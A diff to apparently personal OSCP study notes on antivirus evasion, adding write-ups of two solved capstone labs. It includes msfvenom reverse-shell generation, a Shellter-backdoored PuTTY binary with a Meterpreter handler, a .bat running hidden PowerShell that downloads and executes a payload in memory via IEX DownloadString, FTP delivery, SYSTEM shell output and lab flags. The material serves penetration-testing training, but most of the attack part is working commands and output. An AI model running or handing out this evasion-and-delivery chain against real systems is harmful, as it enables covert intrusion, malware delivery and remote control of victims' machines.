@@ -78,7 +78,7 @@ flowchart TD
     Event["File / network / process event triggers"]
     
     subgraph AV["AV Product — all seven run simultaneously"]
-        FE["📄 File Engine\ninterceptss writes at kernel level"]
+        FE["📄 File Engine\nintercepts writes at kernel level"]
         ME["🧠 Memory Engine\nscans process memory at runtime"]
         NE["🌐 Network Engine\nmonitors traffic for C2 patterns"]
         DS["🔍 Disassembler\nrebuilds code, finds decode loops"]
@@ -301,6 +301,8 @@ How to disable automatic sample submission on Windows Defender:
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f psh-reflection -o bypass.ps1
 ```
 
+> 🔗 **RevShells** — generates ready-to-use reverse shell one-liners in any language including correctly-encoded PowerShell variants, faster than hand-writing them: [revshells.com](https://revshells.com)
+
 The `-f psh-reflection` format produces a complete PowerShell script that:
 - Imports `VirtualAlloc` (kernel32.dll), `CreateThread` (kernel32.dll), and `memset` (msvcrt.dll) via P/Invoke reflection
 - Base64-decodes the embedded shellcode at runtime
@@ -355,6 +357,8 @@ sequenceDiagram
 > 🔁 **Similar to:** the msfvenom shellcode generation here uses the same tool, the same LHOST/LPORT options, and similar bad-character/encoder awareness as [[Fixing Exploits#14.1.4. Fixing the Exploit|14.1.4's Sync Breeze payload]]. The difference is output format: `-f c` for a C byte array that time, `-f psh-reflection` for a full PowerShell script here. Same underlying shellcode generation, different delivery wrapper.
 
 > 🔍 **Worth remembering generally:** `psh-reflection` generates new random function and variable names every time you run `msfvenom`. If an AV engine starts flagging a specific script, regenerate rather than trying to manually rename things. The randomisation is built-in and more thorough than manual editing.
+
+> 🔗 **Video — PowerShell in-memory injection technique walkthrough:** search `"powershell injection msfvenom"` on [ippsec.rocks](https://ippsec.rocks) to find HTB boxes where this exact delivery chain appeared in a real exploitation context.
 
 > 🔍 **Worth remembering generally:** this payload is `windows/shell_reverse_tcp` (stageless) — a plain `nc` listener catches it directly. Using a staged payload like `windows/meterpreter/reverse_tcp` would require a Metasploit `multi/handler` running instead. The stageless choice is deliberate for the same reason as [[Fixing Exploits#Module Exercise VM .23: Unknown service, memory corruption|Module 14's VM #3]]: fewer moving parts, works with plain netcat.
 
@@ -488,7 +492,9 @@ flowchart TD
     style K fill:#2e7d32,color:#fff
 ```
 
+> 📸 Screenshot: Shellter's banner on launch (the ASCII art logo + "Wine Mode" text) — useful reference for confirming Wine is running Shellter correctly
 > 📸 Screenshot: Shellter's console output during the "Tracing..." / injection phase — confirms the PE structure was analysed and shellcode injected successfully
+> 📸 Screenshot: the "Injection: Verified!" confirmation at the end of the Shellter run — the key success indicator before transferring the modified PE
 
 **Setting up a Meterpreter listener** (if using staged `windows/meterpreter/reverse_tcp`):
 ```bash
@@ -508,6 +514,7 @@ client01\offsec
 
 > 🔗 **Shellter official site** (free vs Pro comparison, download): [shellterproject.com](https://www.shellterproject.com/)
 > 🔗 **PayloadsAllTheThings** AV bypass — covers Shellter and alternative PE carriers: [github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass)
+> 🔗 **Video — Shellter PE injection walkthrough:** search `"shellter"` on [ippsec.rocks](https://ippsec.rocks) for HTB boxes where Shellter appeared. Also check the Shellter project's own demo video linked from [shellterproject.com](https://www.shellterproject.com/) — it shows the full interactive workflow including the IAT selection stage.
 
 **Lab status: ✅ Completed** (Q1 pure-recall):
 
@@ -533,7 +540,7 @@ If Shellter was run before wine32 was installed, Wine will have created a broken
 rm -rf ~/.wine && WINEARCH=win32 wineboot
 ```
 
-`WINEARCH=win32` tells Wine to create a fresh 32-bit Windows environment. `wineboot` performs the initialisation (registry, fake Windows folder structure). Harmless-looking OLE errors in the output are normal noise.
+`WINEARCH=win32` tells Wine to create a fresh 32-bit Windows environment. `wineboot` performs the initialisation (registry, fake Windows folder structure). Harmless-looking OLE errors in the output are normal noise. Full flag-by-flag explanation of what each step does and why: [[Antivirus Evasion (Breakdowns)#Why Shellter needs wine32|Command Breakdowns]].
 
 **Step 1: Confirm the Spotify installer is 32-bit**
 
@@ -581,7 +588,7 @@ Shellter's output during injection:
 
 **Step 4: Start the msfconsole handler**
 
-> 🔧 **Critical:** Shellter's `Shell_Reverse_TCP` is a **stager** (note the `[stager]` label in the payload menu). A stager connects back, then expects the handler to send the actual shell code as a second stage. A plain `nc` listener gets the connection and immediately drops it (nc can't serve the stage). You need `multi/handler` with the **staged** payload (`windows/shell/reverse_tcp` with the slash).
+> 🔧 **Critical:** Shellter's `Shell_Reverse_TCP` is a **stager** (note the `[stager]` label in the payload menu). A stager connects back, then expects the handler to send the actual shell code as a second stage. A plain `nc` listener gets the connection and immediately drops it (nc can't serve the stage). You need `multi/handler` with the **staged** payload (`windows/shell/reverse_tcp` with the slash). Full mechanics of why nc drops it: [[Antivirus Evasion (Breakdowns)#Staged vs stageless payloads|Command Breakdowns]]. Quick symptom lookup: [[Shells & Payloads (Decision Tree)#Shellter payload menu shows stager|Decision Tree]].
 
 ```bash
 sudo msfconsole -q -x "use multi/handler; set payload windows/shell/reverse_tcp; set LHOST 192.168.45.219; set LPORT 443; run"
@@ -646,6 +653,22 @@ client01\offsec
 
 > 🚩 **Hands-on, VM spin-up required.** Two Module Exercise VMs — separate from the learning-unit VM (#1 / Windows 11 / Avira) used in the 15.3 walkthroughs above. Both targets run **COMODO** antivirus, a harder target than Avira. Both use an FTP server that auto-executes uploaded `.exe`/`.bat` files from its root directory every few seconds — you don't need a user to manually click anything, just get the file there.
 
+```mermaid
+sequenceDiagram
+    participant K as Kali
+    participant F as Target FTP Root
+    participant V as Victim (auto-runs files every ~5s)
+    participant L as Kali Listener (nc / msfconsole)
+    K->>F: ftp -A / binary / put payload.exe (or .bat)
+    Note over F: file lands in FTP root
+    loop every ~5 seconds
+        V->>F: checks for .exe / .bat files
+        F->>V: auto-executes payload
+    end
+    V->>L: reverse shell connects to LHOST:LPORT
+    Note over L: session opens — no manual click needed
+```
+
 ---
 
 ### Capstone Lab 1: Shellter + PuTTY on Module Exercise VM #1 (COMODO AV)
@@ -702,7 +725,94 @@ sysinfo
 
 > 📸 Screenshot: `getuid` and flag read output in the Meterpreter session
 
-**Lab answer:** ⬜ Pending (flag value to be filled in after hands-on).
+**Capstone 1 — ✅ Solved** (VM #1, 192.168.158.53, anonymous FTP, tun0 192.168.45.219)
+
+**Step 1: Download 32-bit PuTTY and verify**
+```bash
+wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe -O /tmp/putty32.exe
+file /tmp/putty32.exe
+```
+```
+PE32 executable (GUI) Intel 80386, for MS Windows
+```
+
+**Step 2: Copy for Shellter to work on, reset Wine prefix, run Shellter**
+```bash
+cp /tmp/putty32.exe /tmp/putty-backdoor.exe
+rm -rf ~/.wine && WINEARCH=win32 wineboot
+shellter
+```
+
+Shellter interactive answers:
+
+| Prompt | Answer |
+|---|---|
+| Mode | `A` (Auto) |
+| PE Target | `/tmp/putty-backdoor.exe` |
+| Stealth Mode | `Y` |
+| Listed or Custom | `L` |
+| Payload index | `1` (Meterpreter_Reverse_TCP) |
+| LHOST | `192.168.45.219` |
+| LPORT | `443` |
+
+Shellter selected IAT method 5 (`LoadLibrary/GetProcAddress`), injected at `0x4bb662` in `.text`, generated 365 bytes of polymorphic junk code. `Injection: Verified!`
+
+> 📸 Screenshot: Shellter's injection confirmed output and IAT method selected
+
+**Step 3: Start the Meterpreter handler**
+```bash
+sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.45.219; set LPORT 443; run"
+```
+```
+[*] Started reverse TCP handler on 192.168.45.219:443
+```
+
+> 🔧 **Payload must match:** Shellter's `Meterpreter_Reverse_TCP [stager]` requires `windows/meterpreter/reverse_tcp` in the handler (not the shell variant). Using the wrong payload causes the session to open and immediately close.
+
+**Step 4: Upload via FTP (active mode, binary encoding)**
+```bash
+ftp -A 192.168.158.53
+```
+At the prompts: username `anonymous`, password blank (just Enter).
+```
+ftp> binary
+ftp> put /tmp/putty-backdoor.exe putty-backdoor.exe
+ftp> quit
+```
+```
+226 Transfer complete.
+1495552 bytes sent in 00:00 (6.87 MiB/s)
+```
+
+> 🔧 **Two FTP gotchas from this lab:**
+> 1. `-A` flag (active mode) must be on the initial `ftp` command, not toggled inside. The Windows FTP server requires it.
+> 2. `put /tmp/putty-backdoor.exe putty-backdoor.exe` -- the second argument (remote filename) is required. Without it, FTP sends the full local path including `/tmp/` as the remote path, which Windows can't resolve: `550 The system cannot find the path specified`.
+
+**Step 5: Session lands automatically (victim auto-executes every few seconds)**
+```
+[*] Sending stage (203453 bytes) to 192.168.158.53
+[*] Meterpreter session 1 opened (192.168.45.219:443 -> 192.168.158.53:50503)
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+COMODO did not catch the backdoored PuTTY binary.
+
+**Step 6: Drop to shell and read the flag**
+```
+meterpreter > shell
+
+C:\WINDOWS\system32> whoami & type C:\Users\Administrator\Desktop\flag.txt
+nt authority\system
+OS{897020a6b5826057c340bd25e616f091}
+```
+
+> 📸 Screenshot: Meterpreter session opened with `getuid` showing `NT AUTHORITY\SYSTEM`, then the flag read
+
+**Lab answer:** `OS{897020a6b5826057c340bd25e616f091}` as `nt authority\system`
+
+> 🔍 **Worth remembering generally:** landing as SYSTEM via a user auto-executing a file confirms the auto-execution context was already elevated (or ran as SYSTEM directly). In real engagements this is unusual -- most auto-execution mechanisms run as the logged-in user. The lab abstracts away the privilege escalation, but worth noting the realistic scenario would typically land as the user first.
 
 #### Tags: #ShellterCapstone #PuTTY #COMODO #Meterpreter #FTP #ActiveMode #BinaryEncoding #Lab #Module15 #Capstone
 
@@ -728,6 +838,7 @@ cd ~/Veil && sudo ./config/setup.sh --force --silent
 > 📸 Screenshot: Veil's main menu interface on first launch — confirms installation succeeded
 
 > 🔗 **Veil Framework GitHub** (official source, install instructions, payload list): [github.com/Veil-Framework/Veil](https://github.com/Veil-Framework/Veil)
+> 🔗 **Video — Veil framework walkthrough:** search `"veil framework"` on [ippsec.rocks](https://ippsec.rocks) for boxes where Veil appeared. TCM Security's "Practical Ethical Hacking" course also covers Veil in detail if you want a standalone tutorial rather than a box context.
 
 **Step 2: Generate the PowerShell payload**
 ```bash
@@ -769,7 +880,69 @@ whoami
 
 > 📸 Screenshot: `whoami` and flag output in the shell
 
-**Lab answer:** ⬜ Pending.
+**Capstone 2 — ✅ Solved** (VM #2, 192.168.158.53, anonymous FTP, tun0 192.168.45.219)
+
+> 🔧 **Veil wouldn't launch:** Veil's Ruby and AutoIT components failed to install via Wine in a headless terminal environment (XDG_RUNTIME_DIR / no display server). The PowerShell payloads are pure Python and don't need those components, but the broken Wine profile blocks launch entirely. Rather than spending time on a reinstall that may fail the same way, the `.bat` wrapper was built manually -- which is exactly what Veil automates anyway. Understanding the manual approach is more useful than the tool abstraction.
+
+**Step 1: Generate the PowerShell payload**
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.219 LPORT=443 -f psh-reflection -o /tmp/bypass.ps1
+```
+```
+Payload size: 324 bytes
+Final size of psh-reflection file: 2965 bytes
+Saved as: /tmp/bypass.ps1
+```
+
+**Step 2: Create the .bat wrapper manually**
+```bash
+cat > /tmp/payload.bat << 'EOF'
+@echo off
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.219:8080/bypass.ps1')"
+EOF
+```
+
+**What the .bat does:** when double-clicked, it launches PowerShell with no profile (`-NoP`), non-interactive (`-NonI`), hidden window (`-W Hidden`), execution policy bypassed (`-Exec Bypass`), then runs `IEX(DownloadString(...))` to pull `bypass.ps1` from Kali and execute it directly in memory. The `.ps1` never touches disk on the target -- only the `.bat` does, and a `.bat` wrapping PowerShell is far less suspicious to COMODO's static scanner than a raw PowerShell payload. Flag-by-flag teardown of what each switch removes and why it helps: [[Antivirus Evasion (Breakdowns)#The PowerShell AV-bypass flags|Command Breakdowns]].
+
+> 📸 Screenshot: `cat /tmp/payload.bat` output on Kali confirming the PowerShell one-liner is correctly written into the file before uploading
+
+**Step 3: Serve the .ps1 and start the listener**
+```bash
+cd /tmp && python3 -m http.server 8080
+```
+```bash
+sudo nc -nlvp 443
+```
+
+**Step 4: Upload the .bat via FTP**
+```bash
+ftp -A 192.168.158.53
+```
+Username `anonymous`, password blank.
+```
+ftp> binary
+ftp> put /tmp/payload.bat payload.bat
+ftp> quit
+```
+```
+226 Transfer complete.
+```
+
+**Step 5: Shell lands automatically**
+```
+Connection received on 192.168.158.53 50366
+Microsoft Windows [Version 10.0.19044.1415]
+
+C:\WINDOWS\system32> whoami & type C:\Users\Administrator\Desktop\flag.txt
+nt authority\system
+OS{44c3961aad7bb6f399a5e43cdc21cfb4}
+```
+
+> 📸 Screenshot: nc listener showing the connection received and `whoami` + flag read in a single block
+
+**Lab answer:** `OS{44c3961aad7bb6f399a5e43cdc21cfb4}` as `nt authority\system`
+
+> 🔍 **Worth remembering generally:** Veil automates the `.bat` wrapper creation but isn't magic -- it's generating the same `powershell -Exec Bypass "IEX(DownloadString(...))"` one-liner inside a `.bat` file. When the tool breaks, knowing the underlying technique means you can reproduce it in 30 seconds with `cat`. Tool knowledge without technique knowledge is fragile.
 
 > 🔁 **Similar to:** the `.bat`-as-wrapper-for-PowerShell technique mirrors the delivery problem in [[Client-Side Attacks]] where direct script execution often requires user interaction or an execution policy bypass. Veil solves "how do I make a PowerShell script auto-run without the user knowing it's PowerShell" the same way a macro-enabled Office doc solves the equivalent phishing delivery problem.
 
@@ -880,10 +1053,10 @@ ftp <target-ip>
 # Set-MpPreference -SubmitSamplesConsent 2
 ```
 
-- **Command Appendix:** [[AV Evasion]] *(to be created during completion pass)*
-- **Command Breakdowns:** [[AV Evasion (Breakdowns)]] *(to be created during completion pass)*
-- **Decision Tree:** [[AV Evasion (Decision Tree)]] *(to be created during completion pass)*
-- **Methodology Cheat Sheet:** [[Windows Methodology]] *(AV Evasion foothold section to be added during completion pass)*
+- **Command Appendix (AV Evasion sections):** [[Shells & Payloads#PowerShell In-Memory Injection (AV Bypass)|PowerShell In-Memory Injection]], [[Shells & Payloads#Shellter PE Injection|Shellter PE Injection]], [[Shells & Payloads#Staged Payload Handler (msfconsole multi/handler)|Staged Payload Handler]], [[Shells & Payloads#FTP Active-Mode Payload Delivery|FTP Active-Mode Delivery]]
+- **Command Breakdowns:** [[Antivirus Evasion (Breakdowns)]] — PowerShell AV flag semantics, staged vs stageless payload mechanics, wine32/Wine prefix requirements for Shellter
+- **Decision Tree:** [[Shells & Payloads (Decision Tree)]] — "AV blocking payload" node and "Shellter shows [stager]" node both added
+- **Methodology Cheat Sheet:** [[Windows Methodology#Step 2b: AV Evasion (When AV Is Blocking Direct Payloads)|Windows Methodology — Step 2b: AV Evasion]]
 - **Modern Tooling:** no addition for this module. Shellter and Veil are themselves the automation tools for this area, and no faster standalone equivalent to the manual techniques taught exists that isn't a full C2 framework (excluded by Modern Tooling scope). See [[MODERN TOOLING]].
 
 #### Tags: #CommandReference #Module15
@@ -937,7 +1110,7 @@ That said, there are two distinct skills here worth separating: the **AV bypass 
 - [x] **15.2.2 In-memory Evasion:** done (Q1 & Q2 answered, all 4 techniques with diagrams)
 - [x] **15.3.1 Testing for AV Evasion:** done (best practices, VirusTotal/Kleenscan, test VM setup)
 - [x] **15.3.2 Evading AV with Thread Injection:** done (theory, VirtualAlloc Q1 answered, hands-on complete) — key finding: must use `IEX(New-Object Net.WebClient).DownloadString(...)` not `Invoke-WebRequest -OutFile`, Avira's file engine catches the disk write; `client01\offsec`
-- [x] **15.3.3 Automating AV Evasion with Shellter:** done (theory, Stealth Mode Q1 & Q2 answered, Shellter+Spotify hands-on complete — `client01\offsec` via staged shell, Avira bypassed), both capstone labs micro-stepped and pending VM spin-up ⬜
+- [x] **15.3.3 Automating AV Evasion with Shellter:** done (theory, Stealth Mode Q1 & Q2 answered, Shellter+Spotify hands-on complete — `client01\offsec` via staged shell, Avira bypassed), Capstone 1 complete — `NT AUTHORITY\SYSTEM`, flag `OS{897020a6b5826057c340bd25e616f091}`, COMODO bypassed ✅, Capstone 2 complete — `NT AUTHORITY\SYSTEM`, flag `OS{44c3961aad7bb6f399a5e43cdc21cfb4}`, COMODO v12.2.2.8012 bypassed ✅
 - [x] **15.4 Wrapping Up:** done (summary diagram added, external resources linked)
 
-**Module 15 has NOT yet reached [[feedback_oscp_module_completion_pass]] — all hands-on labs and capstones are pending VM spin-up. Hub docs are untouched for this module's content per [[feedback_oscp_methodology_linking]]'s sequencing (hub doc sync only after module is fully done).**
+**Module 15 is fully complete. Solo enrichment pass done (2026-08-09). Joint hub-doc sync done (2026-08-10): [[Windows Methodology]] (Step 2b AV Evasion), [[Shells & Payloads (Decision Tree)]] (AV and stager nodes), [[Shells & Payloads]] (Command Appendix, four new sections), [[Antivirus Evasion (Breakdowns)]] (new file, three entries), [[MODERN TOOLING]] (Module 15 added to no-addition list). Nothing open.**
